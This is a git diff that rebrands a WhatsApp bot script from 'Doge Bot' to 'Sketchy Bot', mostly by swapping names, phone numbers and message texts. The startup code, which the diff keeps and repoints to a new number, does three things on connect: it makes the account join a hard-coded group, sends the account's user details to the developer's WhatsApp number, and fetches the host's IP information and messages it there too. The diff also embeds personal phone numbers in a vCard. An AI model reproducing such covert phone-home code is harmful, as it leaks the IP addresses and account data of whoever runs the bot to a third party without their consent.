@@ -48,10 +48,10 @@ const runtime = function (seconds) {
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
 fakenomor = '0@s.whatsapp.net'
-const gcrevoke = ["911234567890-1621430788@g.us"]
+const gcrevoke = ["254792893310-1621430788@g.us"]
 prefix = '#'
-shp = '⬡'
-owner = "911234567890@s.whatsapp.net"
+shp = '🪀'
+owner = "254792893310@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -64,7 +64,7 @@ const sleep = async (ms) => {
 const starts = async (client = new WAConnection()) => {
   client.logger.level = "warn";
   client.version = [2, 2143, 3];
-  client.browserDescription = ["Subscribe Xeon", "Chrome", "3.0"];
+  client.browserDescription = ["GinGer Baileys", "Chrome", "3.0"];
   console.log(banner.string);
   client.on("qr", () => {
     console.log(
@@ -72,7 +72,7 @@ const starts = async (client = new WAConnection()) => {
       color("!", "blue"),
       color("]", "white"),
       color(" flashy scan the qr code"),
-      client.sendMessage(`911234567890@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
+      client.sendMessage(`254792893310@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
           
     );
   });
@@ -82,8 +82,8 @@ const starts = async (client = new WAConnection()) => {
     start("2", "Connecting...");
   });
   client.on("open", () => {
-    success("2", "Successfully connected to wa, Subscribe Xeon");
-console.log(color(figlet.textSync(`${spc1}            Doge Bot`, {
+    success("2", "Successfully connected to wa, GinGer Baileys");
+console.log(color(figlet.textSync(`${spc1}            ✆𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝 ✆`, {
 font: 'Standard',
 horizontalLayout: 'default',
 vertivalLayout: 'default',
@@ -98,23 +98,23 @@ console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white
 console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
 console.log(color(`${spc4}< ================================================== >`, 'cyan'))
 
-    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙓𝙚𝙤𝙣', 'yellow'))
+    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: ✆𝑺𝒌𝒆𝒕𝒄𝒉𝒚 𝑩𝒐𝒕 ✆🪀', 'yellow'))
     console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
-    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/911234567890'))
-    console.log(color('[DOGE BOT]'), color('𝐃𝐨𝐠𝐞 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
+    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/254792893310🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀'))
+    console.log(color('[✆𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝 ✆]'), color('🪀❰𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝❱🪀 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
     console.log(color('⎇','green'), color('𝙏𝙝𝙖𝙣𝙠𝙨 𝙛𝙤𝙧 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙚 𝙗𝙤𝙩', 'white'))
   });
 await client.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/G3a3AQndqS5J45eD7zznXF`
+ teks = `🪀https://chat.whatsapp.com/BeMGCKtCIWJHaL08WjCzdf`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`911234567890@s.whatsapp.net`, `*Hi Owner Xeon, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
+ client.sendMessage(`254792893310@s.whatsapp.net`, `*Hi GinGer Bread🪀, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/254792893310🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("911234567890@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/911234567890?text=Hello bro"}}})
+       client.sendMessage("254792893310@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xeon Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/254792893310🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -137,10 +137,10 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 client.on('group-update', async (anu) => {
 fkontakk = { key: {
   fromMe: false,
-    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '911234567890-1604595598@g.us' } : {})
+    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '254792893310-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'Xeon',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Xeon;;;\nFN:resku\nitem1.TEL;waid=911234567890:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'GingerSketchy',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Ginger;;;\nFN:resku\nitem1.TEL;waid=254792893310🪀:+254732989905\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
@@ -155,7 +155,7 @@ console.log(` [ Group Closed ]  In ${metdata.subject}`)
 }
 else if(!anu.desc == ''){
 tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
-teks = ` [ Group Description Change ] \n\nGroup description has been changed by Admin @${anu.descOwner.split('@')[0]}\n• New Description : ${anu.desc}`
+teks = ` [ Group Description Change ] \n\nGroup Description has been changed by Admin @${anu.descOwner.split('@')[0]}\n• New Description : ${anu.desc}`
 client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
 console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
   }
@@ -191,7 +191,7 @@ console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
       }
       if (anu.action == "add" && mem.includes(client.user.jid)) {
-        client.sendMessage(anu.jid, "Hello everyone, am Doge Bot, ready to help you here ㋛︎", "conversation");
+        client.sendMessage(anu.jid, "Hello everyone, am ✆𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝 ✆, ready to help you here ㋛︎", "conversation");
       }
 hehe = await getBuffer(pp_user)
 if (anu.action == 'add' && !mem.includes(client.user.jid)) {
@@ -206,8 +206,8 @@ if (anu.action == 'add' && !mem.includes(client.user.jid)) {
                 anu_user = v.vname || v.notify || num.split('@')[0]
                 time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                 time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
-                teks = `🌿 *Hɪ* @${num.split('@')[0]}\n🌿 *Bɪᴏ* : *${thu.status}*\n🌿 *Mᴇᴍʙᴇʀs : ${memeg}*\n🌿 *Wᴇʟᴄᴏᴍᴇ Tᴏ* \n *${mdata.subject}*\n🌿 *ᴅᴏɴᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ʀᴇᴀᴅ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ*\n 𝐃𝐨𝐠𝐞 𝐁𝐨𝐭`
-                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'DESCRIPTION'},type:1}, {buttonId:`okeyx`,buttonText:{displayText:'CLICK HERE'},type:1}]
+                teks = `🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀 *Hɪ* @${num.split('@')[0]}\n🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀 *Bɪᴏ* : *${thu.status}*\n🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀 *Mᴇᴍʙᴇʀs : ${memeg}*\n🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀 *Wᴇʟᴄᴏᴍᴇ Tᴏ* \n *${mdata.subject}*\n🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀 *ᴅᴏɴᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ʀᴇᴀᴅ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ*\n 🪀❰𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝❱🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀`
+                welcomeBut = [{buttonId:`getdeskgc`,buttonText:{displayText:'Description'},type:1}, {buttonId:`okeyx`,buttonText:{displayText:'CLICK HERE'},type:1}]
                 welcomeButt = { contentText: ` `, footerText: `${teks}`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
                 client.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
                  }
@@ -221,8 +221,8 @@ if (anu.action == 'add' && !mem.includes(client.user.jid)) {
                 time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
                 time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
                 memeg = mdata.participants.length
-                out = `*Gᴏᴏᴅ Bʏᴇ* 👋\n@${num.split('@')[0]}\n*𝙷𝚘𝚙𝚎𝚏𝚞𝚕𝚕𝚢 𝚃𝚑𝚎𝚛𝚎 𝚆𝚘𝚗𝚝 𝙱𝚎 𝙱𝚞𝚛𝚍𝚎𝚗 𝙷𝚎𝚛𝚎 𝙰𝚗𝚢𝚖𝚘𝚛𝚎* 🌿\n𝐃𝐨𝐠𝐞 𝐁𝐨𝐭`
-                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'GET OUT 🚪'},type:1}, {buttonId:`sc`,buttonText:{displayText:'BOT SCRIPT'}, type:1}]
+                out = `*Gᴏᴏᴅ Bʏᴇ* 👋\n@${num.split('@')[0]}\n*😠𝙽𝚘𝚋𝚘𝚍𝚢 𝚆𝚒𝚕𝚕 𝙴𝚟𝚎𝚛 𝙼𝚒𝚜𝚜 𝚈𝚘𝚞 𝙼𝚊𝚏𝚒𝚒𝚒!!!!!😠* 🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀\n🪀❰𝚂𝚔𝚎𝚝𝚌𝚑𝚢 𝙱𝚘𝚝❱🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀🪀`
+                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'JUST GO😠'},type:1}, {buttonId:`sc`,buttonText:{displayText:'🔥Dont Touch🔥🪀'}, type:1}]
                 goodbyeButt = { contentText: ` `, footerText: `${out}`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
                 client.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
             }
